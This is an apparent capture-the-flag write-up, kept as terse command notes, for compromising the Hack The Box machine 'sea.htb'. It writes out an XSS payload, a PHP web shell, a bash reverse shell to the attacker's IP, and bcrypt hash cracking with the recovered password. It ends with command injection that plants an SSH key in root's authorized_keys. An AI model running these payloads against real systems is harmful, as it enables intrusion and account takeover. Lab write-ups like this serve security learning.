@@ -1,0 +1,182 @@
+10.129.14.126			 -|-       vpn 10.10.14.166
+[
+	::: /etc/hosts sea.htb
+
+	::: python3 -m http.server 80
+	::: firefox sea.htb/contact.php  
+
+				Website  =>   http://$(mvnb)/xss.js
+	
+	::: gobuster  dir  -u http://sea.htb  -w /usr/share/..../DirBuster-2007_directory-list-2.3-medium.txt
+
+				themes               (Status: 301) [Size: 230] [--> http://sea.htb/themes/]
+				data                 (Status: 301) [Size: 228] [--> http://sea.htb/data/]
+				plugins              (Status: 301) [Size: 231] [--> http://sea.htb/plugins/]
+				messages             (Status: 301) [Size: 232] [--> http://sea.htb/messages/]
+	
+
+	::: gobuster  dir  -u http://sea.htb/themes/  -w /usr/....../directory-list-2.3-medium.txt  -t 300  --no-error  -b 404,403
+
+			bike                 (Status: 301) [Size: 235] [--> http://sea.htb/themes/bike/]
+
+
+	::: gobuster  dir  -u http://sea.htb/themes/bike/  -w /usr/....../directory-list-2.3-medium.txt  -t 300  --no-error  -b 404,403
+
+				version              (Status: 200) [Size: 6]
+				css                  (Status: 301) [Size: 239] [--> http://sea.htb/themes/bike/css/]
+				summary              (Status: 200) [Size: 66]
+				404                  (Status: 200) [Size: 3341]
+				LICENSE              (Status: 200) [Size: 1067]
+
+			http://sea.htb/themes/bike/version
+						===>>>	 3.2.0
+			http://sea.htb/themes/bike/summary
+						===>>>	 Animated bike theme, providing more interaction to your visitors.
+			http://sea.htb/themes/bike/LICENSE
+					  ===>>>			MIT License
+										Copyright (c) 2019 turboblack
+
+	::: firefox --search "theme bike turboblack"
+	 :: firefox --search "WonderCMS theme bike"
+	
+	::: searchsploit wondercms
+
+					WonderCMS 3.1.3 - Authenticated Remote Code Execution                               | php/webapps/49155.py
+					WonderCMS 3.1.3 - Authenticated SSRF to Remote Remote Code Execution                | php/webapps/49154.py
+					WonderCMS 3.4.2 - Remote Code Execution (RCE)                                       | php/remote/52271.py
+					Wondercms 4.3.2 - XSS to RCE                                                        | multiple/webapps/51805.py
+	 :: searchsploit  -x 49155.py
+	 :: searchsploit  -m 49155.py  &&  cat ./49155.py | grep -i login
+
+					http://wonder.com/loginURL   <<<---
+
+	::: searchsploit  -m multiple/webapps/51805.py  &&  mv ./51805.py ./wondercms_rce.py
+
+	::: vim ./wondercms_rce.py
+
+					var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;	 <<<--- line 20
+					.
+					.
+					.
+					XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""     <<<--- line 50
+																												 index.php?page=loginURL?
+
+
+														 firefox http://sea.htb/index.php?page=loginURL
+														 firefox http://sea.htb/index.php?page=....//....//....//....//....//....//....//....//etc/passwd
+
+
+														 firefox http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.166/xss.js"></script><form+action="
+
+
+	 :: ! wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip						<<<--- line 20
+	
+	::: mkdir setensa && cd setensa && touch cmd.php && echo "<?php system($_GET['cmd']); ?>"
+	::: zip main.zip -r ./setensa
+
+	::: firefox sea.htb/contact.php  
+													Name		 =>   test
+													Email    =>   test@test.com
+
+															Website  =>   http://$(mvnb)/xss.js			("el xss.js hara el GET y despues instalaThema/Plugin  main.zip que contiene el cmd.php ")
+
+													Website  =>   http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.166/xss.js"></script><form+action="
+
+	::: python3 -m http.server 80
+
+	::: firefox http://sea.htb/themes/setensa
+	::: firefox http://sea.htb/themes/setensa/cmd.php?cmd=whoami						...RCE...!!!
+
+	::: firefox http://sea.htb/themes/setensa/cmd.php?cmd=bash -c "bash -i >& /dev/tcp/10.10.14.166/6969 0>&1"
+	::: firefox http://sea.htb/themes/setensa/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.166/6969 0>%261"        %26 == &
+
+	::: nc -nlvp 6969
+
+	### www-data
+	www-data::: vim /var/www/sea/data/database.js
+			
+					$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q   vim:.s/\\//g|noh  (' no \ preCrack ')
+
+					$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q   >  hash_file
+
+	::: hashcat hash_file /usr/share/wordlists/rockyou.txt -O                    {{ i_Ctrl-r = trim(system('locate rockyou.txt | tail -n 1')) }}
+
+												# | Name                                                       | Category
+									======+============================================================+======================================
+									25600 | bcrypt(md5($pass))                                         | Generic KDF
+									25800 | bcrypt(sha1($pass))                                        | Generic KDF
+									30600 | bcrypt(sha256($pass))                                      | Generic KDF
+									28400 | bcrypt(sha512($pass))                                      | Generic KDF
+									 3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System					<<<----!!!!!
+									33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
+
+	::: hashcat hash_file /usr/share/wordlists/rockyou.txt -O -m 3200
+
+						Approaching final keyspace - workload adjusted.
+
+						$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+
+						Session..........: hashcat
+						Status...........: Cracked
+
+			 :: hashcat hash_file /usr/share/wordlists/rockyou.txt -O -m 3200  --show      ( --show  show passwordCracked)
+
+	
+	www-data::: cd /home/amay && su amay
+			
+						password:  mychemicalromance
+
+	### amay : mychemicalromance
+	amay::: getcap -r / 2>/dev/null && find / -perm -4000 2>/dev/null
+
+	amay::: ss -nltp
+
+					LISTEN       0            511                       0.0.0.0:80                       0.0.0.0:*
+					LISTEN       0            4096                    127.0.0.1:8080                     0.0.0.0:*		<<<----!!!!
+
+	amay::: curl localhost:8080 --basic -u 'amay:mychemicalromance'
+
+	::: ssh amay@(mvnb) -L 8081:127.0.0.1:8080
+
+	::: lsof -i:8081
+											COMMAND  PID     USER FD   TYPE DEVICE SIZE/OFF NODE NAME											.... Port Forwarding WORKING...<3 
+										ssh     3793 x89p_kal 4u  IPv6  20497      0t0  TCP localhost:tproxy (LISTEN)
+										ssh     3793 x89p_kal 5u  IPv4  20498      0t0  TCP localhost:tproxy (LISTEN)
+
+	::: firefox  localhost:8081
+				::	amay : mychemicalromance
+
+	::: burpsuite					" en FoxyProxy  port:8080 is OK,  NO 8081 OJO....!!!!"
+
+						::frfx    access.log < Analize  "click"    ->> burp -> Proxy
+
+	::: burp
+					Repeater:: 
+									log_file=/etc/passwd&analyze_log=
+
+									log_file=/etc/passwd ; whoami #&analyze_log=					(con # comentamos el resto de la query, sin # no revuelve el output de whoami....!!!!)
+	
+	::: ssh-keygen  &&  cp $HOME/.ssh/id_*.pub ./id_rsa.pub
+
+	::: python3 -m http.server 80
+
+	::: burp
+					Repeater::
+									log_file=/etc/passwd; curl 10.10.14.166/id_rsa.pub -o /root/.ssh/authorized_keys #&analyze_log=
+
+
+	::: ssh root@$(mvnb)
+
+	ROOT:::...<3
+]
+
+{[
+	:::
+	 ::
+
+	{{{
+	:::
+
+	ROOT:::...?
+	}}}
+]}
